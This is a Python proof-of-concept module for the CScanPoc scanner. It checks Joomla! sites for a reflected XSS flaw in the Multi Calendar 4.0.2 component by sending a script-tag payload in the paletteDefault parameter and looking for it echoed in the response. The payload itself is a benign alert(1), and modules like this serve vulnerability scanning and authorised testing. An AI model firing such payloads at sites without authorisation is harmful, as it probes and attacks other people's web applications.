# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib
import urllib2
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'Joomla_0008'  # 平台漏洞编号，留空
    name = 'Joomla! Multi Calendar 4.0.2 XSS'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2014-10-29'  # 漏洞公布时间
    desc = '''
        Multiple cross-site scripting (XSS) vulnerabilities in Multi
        calendar 4.0.2 component for Joomla! allow remote attackers to inject arbitrary
        web script or HTML code via (1) the calid parameter to index.php or (2) the paletteDefault
        parameter to index.php.
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Joomla!'  # 漏洞应用名称
    product_version = '4.0.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ec59041e-0e33-43e8-8db0-9122f313eb16'
    author = '国光'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/index.php?option=com_multicalendar&task=editevent&paletteDefault=1"/><script>alert(1)</script>'
            verify_url = '{target}'.format(target=self.target)+payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            if '"/><script>alert(1)</script>' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
